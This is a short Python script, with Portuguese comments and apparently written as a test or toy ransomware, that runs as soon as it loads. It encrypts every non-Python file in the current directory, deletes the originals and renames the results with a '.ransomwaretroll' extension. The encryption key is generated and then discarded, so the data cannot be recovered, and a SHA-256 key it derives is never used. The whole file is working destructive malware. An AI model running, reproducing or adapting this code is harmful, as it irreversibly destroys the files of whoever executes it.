import os
import hashlib
from cryptography.fernet import Fernet

def encrypt_directory():
    current_dir = os.getcwd()
    
    # Gerar chave usando SHA256
    key = hashlib.sha256(b"testeransomwares").digest()
    fernet_key = Fernet.generate_key()
    cipher_suite = Fernet(fernet_key)
    
    for filename in os.listdir(current_dir):
        if filename.endswith('.py') or filename.endswith('.ransomwaretroll'):
            continue
        
        file_path = os.path.join(current_dir, filename)
        
        if os.path.isfile(file_path):
            try:
                with open(file_path, "rb") as file:
                    file_data = file.read()
                
                crypto_data = cipher_suite.encrypt(file_data)
                
                os.remove(file_path)
                
                new_file_path = file_path + ".ransomwaretroll"
                with open(new_file_path, 'wb') as new_file:
                    new_file.write(crypto_data)
                
                print(f"Criptografado: {filename}")
            except Exception as e:
                print(f"Erro ao criptografar {filename}: {e}")

encrypt_directory()
